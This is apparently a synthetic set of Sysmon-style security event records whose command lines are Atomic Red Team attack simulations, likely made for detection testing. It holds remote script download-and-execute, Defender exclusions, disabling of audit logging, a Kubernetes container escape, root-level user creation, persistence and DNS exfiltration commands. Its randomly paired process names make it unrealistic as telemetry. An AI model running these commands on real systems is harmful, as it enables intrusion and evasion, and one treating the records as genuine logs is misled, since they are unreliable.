    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-71.chapman-foster.com",
        "User": "carol41",
        "ProcessID": 1082,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}\",",
        "LogonID": 612469,
        "LogonGuid": "1ec817ee-ca70-454c-91da-8641294d2faa",
        "SourceProcessID": 8050,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\look..exe",
        "DestinationProcessID": 1517,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\bring..dll",
        "UtcTime": "2024-05-17T01:36:51.814000Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-88.wright.biz",
        "User": "jochoa",
        "ProcessID": 8317,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Add-Type -AssemblyName System.IdentityModel\\n$ComputerFQDN=$env:LogonServer.trimStart('\\\\') + \\\".\\\" + $env:UserDnsDomain\\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \\\"HTTP/$ComputerFQDN\\\" \\n\",",
        "LogonID": 417057,
        "LogonGuid": "1e29f4c3-d86a-4c5b-91e0-3b876235283d",
        "SourceProcessID": 8754,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\develop..dll",
        "DestinationProcessID": 8976,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\where..exe",
        "UtcTime": "2024-05-17T01:36:51.815001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-47.walker.com",
        "User": "ypowers",
        "ProcessID": 9246,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\Audit\\\" -Name \\\"ProcessCreationIncludeCmdLine_Enabled\\\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\\n\",",
        "LogonID": 779889,
        "LogonGuid": "5821cf63-94f8-407b-8a96-9bc4db8e1213",
        "SourceProcessID": 2624,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\your..exe",
        "DestinationProcessID": 7642,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\draw..exe",
        "UtcTime": "2024-05-17T01:36:51.815001Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-92.nelson-li.com",
        "User": "josephscott",
        "ProcessID": 4481,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sc query type=service > %TEMP%\\\\T1119_1.txt\\ndoskey /history > %TEMP%\\\\T1119_2.txt\\nwmic process list > %TEMP%\\\\T1119_3.txt\\ntree C:\\\\AtomicRedTeam\\\\atomics > %TEMP%\\\\T1119_4.txt\\n\",",
        "LogonID": 947926,
        "LogonGuid": "13b3b054-9034-4288-ba15-a4b8b0ed3eb6",
        "SourceProcessID": 4457,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\case..dll",
        "DestinationProcessID": 6078,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\role..dll",
        "UtcTime": "2024-05-17T01:36:51.815001Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-31.sanders.org",
        "User": "newtonharold",
        "ProcessID": 2062,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$edgePath64 = \\\"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\\\"\\nif (Test-Path $edgePath64) {\\n    $edgePath = $edgePath64\\n} else {\\n    # Check 32-bit Edge installation path\\n    $edgePath32 = \\\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\\\"\\n    if (Test-Path $edgePath32) {\\n        $edgePath = $edgePath32\\n    } else {\\n        exit 1\\n    }\\n}\\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe &&\\\"\\nsleep 5\\ntaskkill -f -im msedge.exe\\ntaskkill -f -im calc.exe\\ntaskkill -f -im win32calc.exe\\n\",",
        "LogonID": 232579,
        "LogonGuid": "83081a90-74fc-4d59-9660-333b91168503",
        "SourceProcessID": 3027,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\amount..dll",
        "DestinationProcessID": 9168,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\become..dll",
        "UtcTime": "2024-05-17T01:36:51.815001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-43.morris.biz",
        "User": "lewisthomas",
        "ProcessID": 4981,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\\nGet-ChildItem -Path HKCR:\\\\CLSID -Name | Select -Skip 1 > $env:temp\\\\clsids.txt\\nForEach($CLSID in Get-Content \\\"$env:temp\\\\clsids.txt\\\")\\n{try{write-output \\\"$($Position)-$($CLSID)\\\"\\nwrite-output \\\"------------\\\"| out-file #{output_file} -append\\nwrite-output $($CLSID)| out-file #{output_file} -append\\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\\n$position += 1} catch{}}\\n\",",
        "LogonID": 839334,
        "LogonGuid": "ccf8f5bf-8016-40e6-a76c-84168e9a0550",
        "SourceProcessID": 9412,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\pull..dll",
        "DestinationProcessID": 6708,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\writer..exe",
        "UtcTime": "2024-05-17T01:36:51.815001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-71.morris-jones.com",
        "User": "swhite",
        "ProcessID": 7484,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"export AWS_REGION=#{aws_region} \\ncd #{stratus_path}\\necho \\\"starting warmup\\\"\\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\\necho \\\"starting detonate\\\"\\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\\n\",",
        "LogonID": 806466,
        "LogonGuid": "873517c2-f05b-4878-b1f8-b21e590f680d",
        "SourceProcessID": 7195,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\player..dll",
        "DestinationProcessID": 3662,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\and..dll",
        "UtcTime": "2024-05-17T01:36:51.816001Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-84.good.com",
        "User": "rebeccacox",
        "ProcessID": 6946,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$excludedExts= \\\"#{excluded_exts}\\\"\\nAdd-MpPreference -ExclusionExtension  $excludedExts\",",
        "LogonID": 195774,
        "LogonGuid": "b0cbdb26-191c-420e-844e-866b0aa0d4ad",
        "SourceProcessID": 8859,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\conference..dll",
        "DestinationProcessID": 2457,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\training..exe",
        "UtcTime": "2024-05-17T01:36:51.816001Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-70.klein.net",
        "User": "umeyer",
        "ProcessID": 1191,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\\n$url = \\\"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\\\"\\n$output = \\\"$env:TEMP\\\\Invoke-Phant0m.ps1\\\"\\n$wc = New-Object System.Net.WebClient\\n$wc.DownloadFile($url, $output)\\ncd $env:TEMP\\nImport-Module .\\\\Invoke-Phant0m.ps1\\nInvoke-Phant0m\\n\",",
        "LogonID": 493102,
        "LogonGuid": "d8bf8c28-6e3e-4660-bc19-27ab00a94216",
        "SourceProcessID": 9716,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\culture..exe",
        "DestinationProcessID": 3600,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\hotel..exe",
        "UtcTime": "2024-05-17T01:36:51.816001Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-79.sims-dickerson.com",
        "User": "oestrada",
        "ProcessID": 1537,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"wmic.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\",",
        "LogonID": 795090,
        "LogonGuid": "9c5e237c-2663-4849-90de-3b9383fed2d8",
        "SourceProcessID": 6278,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\decade..dll",
        "DestinationProcessID": 3396,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\past..exe",
        "UtcTime": "2024-05-17T01:36:51.816001Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-87.esparza.net",
        "User": "waltersdavid",
        "ProcessID": 8163,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Invoke-WebRequest -OutFile C:\\\\Users\\\\$env:username\\\\Desktop\\\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\\n$file1 = \\\"C:\\\\Users\\\\\\\" + $env:username + \\\"\\\\Desktop\\\\LogMeInIgnition.msi\\\"\\nStart-Process -Wait $file1 /quiet;\\nStart-Process 'C:\\\\Program Files (x86)\\\\LogMeIn Ignition\\\\LMIIgnition.exe' \\\"/S\\\"\\n\",",
        "LogonID": 366307,
        "LogonGuid": "42981652-59d1-419d-b2bf-1f0cf89e2f20",
        "SourceProcessID": 6348,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\newspaper..dll",
        "DestinationProcessID": 1491,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\eye..exe",
        "UtcTime": "2024-05-17T01:36:51.816001Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-56.duncan.biz",
        "User": "aprilleon",
        "ProcessID": 7678,
        "ProcessName": "malware.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\\nInvoke-watson\",",
        "LogonID": 299453,
        "LogonGuid": "7951c59e-e42f-4cff-8f26-e4fa7eede2fe",
        "SourceProcessID": 6180,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\believe..dll",
        "DestinationProcessID": 2495,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\walk..exe",
        "UtcTime": "2024-05-17T01:36:51.817002Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-25.holland-mercer.org",
        "User": "stewartheather",
        "ProcessID": 4896,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Office\\\\#{outlook_version}\\\\Outlook\\\\WebView\\\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\\n\",",
        "LogonID": 814648,
        "LogonGuid": "c8dbf22b-c951-464b-81cc-e93f9894819c",
        "SourceProcessID": 8546,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\win..exe",
        "DestinationProcessID": 7726,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\capital..dll",
        "UtcTime": "2024-05-17T01:36:51.817002Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-40.alvarado.com",
        "User": "sullivanemily",
        "ProcessID": 7022,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Mount-DiskImage -ImagePath \\\"#{path_of_iso}\\\" -StorageType ISO -Access ReadOnly\\n$keep = Get-Volume -FileSystemLabel \\\"TestIso\\\"\\n$driveLetter = ($keep | Get-Volume).DriveLetter\\ninvoke-item \\\"$($driveLetter):\\\\hello.exe\\\"\\n\",",
        "LogonID": 310363,
        "LogonGuid": "804e58ca-42d0-4871-abdc-92a5e6d81499",
        "SourceProcessID": 2778,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\law..exe",
        "DestinationProcessID": 4650,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\attack..dll",
        "UtcTime": "2024-05-17T01:36:51.817002Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-23.turner.com",
        "User": "stephaniejohnson",
        "ProcessID": 6632,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Set-ExecutionPolicy -Scope Process Bypass -Force\\n$owners = @{}\\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\\nGet-Process | Select ProcessName,Id,@{l=\\\"Owner\\\";e={$owners[$_.id.tostring()]}}\\n& \\\"$PathToAtomicsFolder\\\\T1134.002\\\\src\\\\GetToken.ps1\\\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\\\"cmd.exe\\\")\\n\",",
        "LogonID": 818850,
        "LogonGuid": "348ede36-9767-4bef-9ecb-4f401faa1af2",
        "SourceProcessID": 2876,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\conference..dll",
        "DestinationProcessID": 1251,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\seven..dll",
        "UtcTime": "2024-05-17T01:36:51.817002Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-46.carr.org",
        "User": "garciasteve",
        "ProcessID": 3722,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"yes > /dev/null\\n\",",
        "LogonID": 892039,
        "LogonGuid": "28b07b91-03d5-48e0-9266-16f563a0e562",
        "SourceProcessID": 8154,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\little..dll",
        "DestinationProcessID": 4641,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\scene..exe",
        "UtcTime": "2024-05-17T01:36:51.818000Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-11.baldwin.biz",
        "User": "douglascamacho",
        "ProcessID": 1822,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"xcopy /I /Y \\\"#{web_shells}\\\" #{web_shell_path}\\n\",",
        "LogonID": 549819,
        "LogonGuid": "3eeed7f4-6f13-4984-8ad6-e17428e0060c",
        "SourceProcessID": 5303,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\traditional..exe",
        "DestinationProcessID": 1118,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\fund..exe",
        "UtcTime": "2024-05-17T01:36:51.818000Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-08.jones.com",
        "User": "fsmith",
        "ProcessID": 3179,
        "ProcessName": "malware.exe",
        "CommandLine": "\"New-Item -Path #{teamviewer_log_file} -Force | Out-Null\\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\\n\",",
        "LogonID": 907058,
        "LogonGuid": "cbc7f4ff-ec17-4f4f-884e-8f0eb88b476e",
        "SourceProcessID": 5169,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\where..exe",
        "DestinationProcessID": 8483,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\class..exe",
        "UtcTime": "2024-05-17T01:36:51.818000Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-14.chavez.info",
        "User": "edward72",
        "ProcessID": 2118,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wevtutil enum-logs\"",
        "LogonID": 110145,
        "LogonGuid": "d29fb1e9-50f4-428e-92b1-6c861de0e77b",
        "SourceProcessID": 6508,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\stuff..exe",
        "DestinationProcessID": 1315,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\summer..dll",
        "UtcTime": "2024-05-17T01:36:51.818000Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-91.dixon.com",
        "User": "tiffany66",
        "ProcessID": 5613,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$excludedProcess = \\\"#{excluded_process}\\\"\\nAdd-MpPreference -ExclusionProcess $excludedProcess\",",
        "LogonID": 608972,
        "LogonGuid": "fa6fb0df-8aa5-40db-81ab-aa43e8fb2303",
        "SourceProcessID": 8205,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\learn..dll",
        "DestinationProcessID": 5214,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\history..dll",
        "UtcTime": "2024-05-17T01:36:51.818000Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-34.patel.com",
        "User": "erica09",
        "ProcessID": 6757,
        "ProcessName": "malware.exe",
        "CommandLine": "\"echo '#{text_to_append}' >> /etc/profile\\n\",",
        "LogonID": 169825,
        "LogonGuid": "3c39d5d6-1281-427a-998e-b11296cd7419",
        "SourceProcessID": 8212,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\child..exe",
        "DestinationProcessID": 7670,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\race..exe",
        "UtcTime": "2024-05-17T01:36:51.819003Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-90.watson-bolton.com",
        "User": "david87",
        "ProcessID": 7803,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo \\\"#{script_command}\\\" > #{script_path}\\nREG.exe ADD HKCU\\\\Environment /v UserInitMprLogonScript /t REG_SZ /d \\\"#{script_path}\\\" /f\\n\",",
        "LogonID": 416562,
        "LogonGuid": "c9f021b4-ac8e-4110-8e15-f909703d56b9",
        "SourceProcessID": 4586,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\easy..exe",
        "DestinationProcessID": 7754,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\avoid..dll",
        "UtcTime": "2024-05-17T01:36:51.819003Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-66.garza.com",
        "User": "pvasquez",
        "ProcessID": 5630,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"netsh advfirewall firewall add rule name=\\\"Open Port to Any\\\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any\",",
        "LogonID": 961569,
        "LogonGuid": "b5e30544-3879-4712-beb3-b40548588e99",
        "SourceProcessID": 9125,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\plan..dll",
        "DestinationProcessID": 5824,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\glass..exe",
        "UtcTime": "2024-05-17T01:36:51.819003Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-44.davenport.org",
        "User": "ericaphillips",
        "ProcessID": 7856,
        "ProcessName": "nc.exe",
        "CommandLine": "\"#{regsvr32path}\\\\#{regsvr32name} /s /u /i:\\\"#{filename}\\\" scrobj.dll\\n\",",
        "LogonID": 369715,
        "LogonGuid": "f6717182-65c6-4531-bcc5-17bac2674fbc",
        "SourceProcessID": 8088,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\like..dll",
        "DestinationProcessID": 1388,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\east..dll",
        "UtcTime": "2024-05-17T01:36:51.819003Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-90.burgess.com",
        "User": "ccoffey",
        "ProcessID": 2566,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\\\"spec\\\":{\\\"hostPID\\\": true, \\\"containers\\\":[{\\\"name\\\":\\\"1\\\",\\\"image\\\":\\\"alpine\\\",\\\"command\\\":[\\\"nsenter\\\",\\\"--mount=/proc/1/ns/mnt\\\",\\\"--\\\",\\\"/bin/bash\\\"],\\\"stdin\\\": true,\\\"tty\\\":true,\\\"securityContext\\\":{\\\"privileged\\\":true}}]}}'\\n\",",
        "LogonID": 410011,
        "LogonGuid": "67d28715-e1be-4657-b4c7-cb21cd2c944d",
        "SourceProcessID": 7423,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\brother..dll",
        "DestinationProcessID": 5048,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\size..exe",
        "UtcTime": "2024-05-17T01:36:51.820004Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-07.reyes-smith.biz",
        "User": "espinozajennifer",
        "ProcessID": 7043,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"useradd -g 0 -M -d /root -s /bin/bash #{username}\\nif [ $(cat /etc/os-release | grep -i 'Name=\\\"ubuntu\\\"') ]; then echo \\\"#{username}:#{password}\\\" | sudo chpasswd; else echo \\\"#{password}\\\" | passwd --stdin #{username}; fi;\\n\",",
        "LogonID": 685787,
        "LogonGuid": "480ea6cd-cf78-4ee8-9b47-ed5409a80172",
        "SourceProcessID": 9663,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\up..exe",
        "DestinationProcessID": 3351,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\throw..exe",
        "UtcTime": "2024-05-17T01:36:51.820004Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-78.vaughn-rivas.biz",
        "User": "heather40",
        "ProcessID": 7995,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"wmic #{wmic_command} /FORMAT:\\\"#{remote_xsl_file}\\\"\\n\",",
        "LogonID": 718487,
        "LogonGuid": "51fc4759-e9e3-46fd-add0-f3784b5b687c",
        "SourceProcessID": 8496,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\senior..exe",
        "DestinationProcessID": 4257,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\range..dll",
        "UtcTime": "2024-05-17T01:36:51.820004Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-36.cox-robertson.info",
        "User": "erogers",
        "ProcessID": 1479,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add HKCU\\\\SOFTWARE\\\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\\nschtasks.exe /Create /F /TN \\\"ATOMIC-T1053.005\\\" /TR \\\"cmd /c start /min \\\\\\\"\\\\\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\\\\\SOFTWARE\\\\\\\\ATOMIC-T1053.005).test)))\\\" /sc daily /st #{time}\\n\",",
        "LogonID": 392318,
        "LogonGuid": "b703f39e-f73b-4b95-905d-a9f16a0a2dcf",
        "SourceProcessID": 3865,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\reduce..exe",
        "DestinationProcessID": 4465,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\color..dll",
        "UtcTime": "2024-05-17T01:36:51.820004Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-58.pope.com",
        "User": "timothybrewer",
        "ProcessID": 5468,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"xcopy /I /Y \\\"#{web_shells}\\\" #{web_shell_path}\\n\",",
        "LogonID": 229182,
        "LogonGuid": "b1be30d5-20f4-4f57-a315-2c20e86cdcf9",
        "SourceProcessID": 9858,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\seven..exe",
        "DestinationProcessID": 3927,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\on..dll",
        "UtcTime": "2024-05-17T01:36:51.820004Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-90.davis.net",
        "User": "fgarrison",
        "ProcessID": 7488,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideClock /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 154797,
        "LogonGuid": "47233c9f-69d1-46a2-9b01-209d51410dbb",
        "SourceProcessID": 2571,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\machine..exe",
        "DestinationProcessID": 5664,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\do..exe",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-26.hayden.net",
        "User": "sabrinaherrera",
        "ProcessID": 3924,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"#{msbuildpath}\\\\#{msbuildname} \\\"#{filename}\\\"\\n\",",
        "LogonID": 938891,
        "LogonGuid": "b72e631a-fb95-49eb-bfc6-bfd455dff838",
        "SourceProcessID": 8919,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\country..dll",
        "DestinationProcessID": 4011,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\little..dll",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-45.atkinson.com",
        "User": "jennifercarlson",
        "ProcessID": 7854,
        "ProcessName": "malware.exe",
        "CommandLine": "\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"#{thing_to_execute}\\\"\\n\",",
        "LogonID": 375160,
        "LogonGuid": "38e2eb03-55a1-444a-8f76-863fea54089d",
        "SourceProcessID": 9094,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\clear..dll",
        "DestinationProcessID": 1303,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\list..dll",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-22.warren.info",
        "User": "erica25",
        "ProcessID": 4724,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo -n 111-11-1111 | b64encode -r -\\ncurl -XPOST #{base64_data}.#{destination_url}\\n\",",
        "LogonID": 256958,
        "LogonGuid": "c5f9f581-57b0-41fe-93f1-cf7f233ac46c",
        "SourceProcessID": 9836,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\glass..dll",
        "DestinationProcessID": 5630,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\way..exe",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-79.wilson-johnson.org",
        "User": "jamesjohnson",
        "ProcessID": 4140,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 765515,
        "LogonGuid": "e4df0792-809b-4320-b42c-4f8dd69ab45f",
        "SourceProcessID": 2591,
        "SourceProcessName": "cmd.exe",
